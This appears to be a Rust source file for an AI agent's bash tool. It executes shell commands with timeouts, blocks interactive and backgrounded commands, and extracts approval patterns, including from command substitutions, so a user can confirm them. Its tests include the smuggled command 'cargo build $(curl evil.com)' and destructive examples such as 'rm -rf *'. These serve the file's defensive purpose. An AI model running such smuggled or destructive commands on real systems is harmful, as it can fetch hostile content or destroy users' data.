use super::{kill_process_group, str_arg, timeout_arg, Tool, ToolContext, ToolFuture, ToolResult};
use protocol::EngineEvent;
use serde_json::Value;
use std::collections::HashMap;
use tokio::io::{AsyncBufReadExt, BufReader};

fn is_default_allowed_pattern(pattern: &str) -> bool {
    crate::permissions::DEFAULT_BASH_ALLOW.contains(&pattern)
}

pub struct BashTool;

impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }

    fn description(&self) -> &str {
        "Execute a non-interactive bash command and return its output. The working directory persists between calls. Commands time out after 2 minutes by default (configurable up to 10 minutes). Do not use shell backgrounding (`&`) in the command string. Do not run interactive commands (editors, pagers, interactive rebases, etc.) — they will hang. If there is no non-interactive alternative, ask the user to run it themselves."
    }

    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Shell command to execute"},
                "description": {"type": "string", "description": "Short (max 10 words) description of what this command does"},
                "timeout_ms": {"type": "integer", "description": "Timeout in milliseconds (default: 120000, max: 600000)"}
            },
            "required": ["command"]
        })
    }

    fn needs_confirm(&self, args: &HashMap<String, Value>) -> Option<String> {
        Some(str_arg(args, "command"))
    }

    fn approval_patterns(&self, args: &HashMap<String, Value>) -> Vec<String> {
        let cmd = str_arg(args, "command");
        // split_shell_commands already extracts embedded commands from $(...),
        // backticks, and (...) subshells, so all binaries are surfaced.
        let subcmds = crate::permissions::split_shell_commands(&cmd);
        let mut patterns = Vec::new();
        for subcmd in &subcmds {
            let bin = subcmd.split_whitespace().next().unwrap_or("");
            let base = bin.rsplit('/').next().unwrap_or(bin);
            // `cd` is handled as a path permission, not a command permission.
            if !base.is_empty() && base != "cd" {
                let pat = format!("{base} *");
                if !is_default_allowed_pattern(&pat) && !patterns.contains(&pat) {
                    patterns.push(pat);
                }
            }
        }
        patterns
    }

    fn execute<'a>(&'a self, args: HashMap<String, Value>, ctx: &'a ToolContext) -> ToolFuture<'a> {
        Box::pin(async move {
            let command = str_arg(&args, "command");

            if let Some(msg) = check_interactive(&command) {
                return ToolResult::err(msg.to_string());
            }

            if let Some(msg) = check_shell_background_operator(&command) {
                return ToolResult::err(msg);
            }

            execute_streaming(&command, &args, ctx).await
        })
    }
}

/// Known interactive binaries that require a TTY.
const INTERACTIVE_BINS: &[&str] = &[
    "vim", "nvim", "vi", "nano", "emacs", "pico", "less", "more", "top", "htop", "btop", "nmon",
    "irb", "ghci",
];

/// Git subcommands whose `-i`/`--interactive` flag requires a TTY.
const GIT_INTERACTIVE_SUBCMDS: &[&str] = &["rebase", "add", "checkout", "clean", "stash"];

pub fn check_interactive(command: &str) -> Option<&'static str> {
    let cmds = crate::permissions::split_shell_commands(command);
    for subcmd in &cmds {
        let parts: Vec<&str> = subcmd.split_whitespace().collect();
        let bin = match parts.first() {
            Some(b) => *b,
            None => continue,
        };
        // Check known interactive binaries (handle paths like /usr/bin/vim)
        let base = bin.rsplit('/').next().unwrap_or(bin);
        if INTERACTIVE_BINS.contains(&base) {
            return Some("Interactive commands (editors, REPLs, pagers) cannot run here — they require a terminal. If there is no non-interactive alternative, ask the user to run it themselves.");
        }
        // Check git interactive flags
        if base == "git" {
            let has_interactive_flag = parts.iter().any(|p| *p == "-i" || *p == "--interactive");
            if has_interactive_flag {
                let has_interactive_subcmd =
                    parts.iter().any(|p| GIT_INTERACTIVE_SUBCMDS.contains(p));
                if has_interactive_subcmd {
                    return Some("Interactive git commands (rebase -i, add -i, etc.) cannot run here — they require a terminal. If there is no non-interactive alternative, ask the user to run it themselves.");
                }
            }
        }
    }
    None
}

pub fn check_shell_background_operator(command: &str) -> Option<String> {
    let has_background_operator = crate::permissions::split_shell_commands_with_ops(command)
        .iter()
        .any(|(_, op)| op.as_deref() == Some("&"));

    if has_background_operator {
        Some(
            "Shell backgrounding (`&`) is not supported in `bash` commands here. Remove `&` and set `run_in_background=true` on the tool call. Then use `read_process_output` and `stop_process` with the returned process id."
                .to_string(),
        )
    } else {
        None
    }
}

async fn execute_streaming(
    command: &str,
    args: &HashMap<String, Value>,
    ctx: &ToolContext,
) -> ToolResult {
    let timeout = timeout_arg(args, 120);

    let mut child = match tokio::process::Command::new("sh")
        .arg("-c")
        .arg(command)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .process_group(0)
        .spawn()
    {
        Ok(c) => c,
        Err(e) => return ToolResult::err(e.to_string()),
    };

    let stdout = child.stdout.take().unwrap();
    let stderr = child.stderr.take().unwrap();
    let mut stdout_reader = BufReader::new(stdout).lines();
    let mut stderr_reader = BufReader::new(stderr).lines();
    let mut output = String::new();
    let mut stdout_done = false;
    let mut stderr_done = false;

    let deadline = tokio::time::sleep(timeout);
    tokio::pin!(deadline);

    loop {
        if stdout_done && stderr_done {
            break;
        }
        tokio::select! {
            line = stdout_reader.next_line(), if !stdout_done => {
                match line {
                    Ok(Some(line)) => {
                        let _ = ctx.event_tx.send(EngineEvent::ToolOutput {
                            call_id: ctx.call_id.to_string(),
                            chunk: line.clone(),
                        });
                        if !output.is_empty() { output.push('\n'); }
                        output.push_str(&line);
                    }
                    _ => stdout_done = true,
                }
            }
            line = stderr_reader.next_line(), if !stderr_done => {
                match line {
                    Ok(Some(line)) => {
                        let _ = ctx.event_tx.send(EngineEvent::ToolOutput {
                            call_id: ctx.call_id.to_string(),
                            chunk: line.clone(),
                        });
                        if !output.is_empty() { output.push('\n'); }
                        output.push_str(&line);
                    }
                    _ => stderr_done = true,
                }
            }
            _ = &mut deadline => {
                kill_process_group(&child);
                return ToolResult::err(format!("timed out after {:.0}s", timeout.as_secs_f64()));
            }
            _ = ctx.cancel.cancelled() => {
                kill_process_group(&child);
                return ToolResult::err("cancelled");
            }
        }
    }

    let status = child.wait().await;
    let is_error = status.map(|s| !s.success()).unwrap_or(true);
    ToolResult {
        content: output,
        is_error,
        metadata: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn patterns(cmd: &str) -> Vec<String> {
        let tool = BashTool;
        let mut args = HashMap::new();
        args.insert("command".into(), Value::String(cmd.into()));
        tool.approval_patterns(&args)
    }

    #[test]
    fn simple_command() {
        assert_eq!(patterns("cargo build"), vec!["cargo *"]);
    }

    #[test]
    fn chain_same_binary() {
        // Deduplicated: both sub-commands use "cargo"
        assert_eq!(patterns("cargo fmt && cargo clippy"), vec!["cargo *"]);
    }

    #[test]
    fn chain_different_binaries() {
        // cd is treated as a path permission, not a command permission
        assert_eq!(patterns("cd /tmp; rm -rf foo"), vec!["rm *"]);
    }

    #[test]
    fn pipe() {
        // cat and grep are both in default allowed patterns, so no approval needed
        assert_eq!(patterns("cat file.txt | grep foo"), Vec::<String>::new());
    }

    #[test]
    fn mixed() {
        // grep and echo are in default allowed patterns, so they're filtered out
        // cd is treated as a path permission, not a command permission
        assert_eq!(
            patterns("cd /tmp && rm -rf * | grep err; echo done"),
            vec!["rm *"]
        );
    }

    #[test]
    fn background_operator() {
        assert_eq!(patterns("sleep 5 & echo done"), vec!["sleep *"]);
    }

    #[test]
    fn quoted_operator_not_split() {
        // grep is in default allowed patterns, so no approval needed
        assert_eq!(patterns(r#"grep "&&" file.txt"#), Vec::<String>::new());
    }

    #[test]
    fn empty_command() {
        assert!(patterns("").is_empty());
    }

    #[test]
    fn only_whitespace() {
        assert!(patterns("   ").is_empty());
    }

    #[test]
    fn parens_inside_double_quotes_not_extracted() {
        // "fix(tui): ..." should NOT extract "tui" as a subshell command
        assert_eq!(
            patterns(r#"git commit -m "fix(tui): keep lists sized""#),
            vec!["git *"]
        );
    }

    #[test]
    fn embedded_command_substitution() {
        // $() embedded commands are surfaced in approval patterns
        let p = patterns("cargo build $(curl evil.com)");
        assert!(p.contains(&"cargo *".to_string()));
        assert!(p.contains(&"curl *".to_string()));
    }

    #[test]
    fn path_qualified_binary_uses_basename() {
        assert_eq!(patterns("/usr/bin/make -j4"), vec!["make *"]);
    }

    #[test]
    fn interactive_vim_blocked() {
        assert!(check_interactive("vim file.txt").is_some());
    }

    #[test]
    fn interactive_nvim_blocked() {
        assert!(check_interactive("nvim").is_some());
    }

    #[test]
    fn interactive_less_blocked() {
        assert!(check_interactive("less /var/log/syslog").is_some());
    }

    #[test]
    fn interactive_git_rebase_i_blocked() {
        assert!(check_interactive("git rebase -i HEAD~3").is_some());
    }

    #[test]
    fn interactive_git_add_i_blocked() {
        assert!(check_interactive("git add --interactive").is_some());
    }

    #[test]
    fn non_interactive_git_rebase_allowed() {
        assert!(check_interactive("git rebase main").is_none());
    }

    #[test]
    fn non_interactive_cargo_allowed() {
        assert!(check_interactive("cargo build").is_none());
    }

    #[test]
    fn interactive_in_chain_blocked() {
        assert!(check_interactive("echo hello && vim file.txt").is_some());
    }

    #[test]
    fn interactive_with_path_blocked() {
        assert!(check_interactive("/usr/bin/vim file.txt").is_some());
    }

    #[test]
    fn shell_background_operator_blocked() {
        assert!(check_shell_background_operator("sleep 10 &").is_some());
    }

    #[test]
    fn shell_background_operator_in_chain_blocked() {
        assert!(check_shell_background_operator("echo hi & echo done").is_some());
    }

    #[test]
    fn redirection_with_ampersand_allowed() {
        assert!(check_shell_background_operator("bun run dev 2>&1").is_none());
    }
}
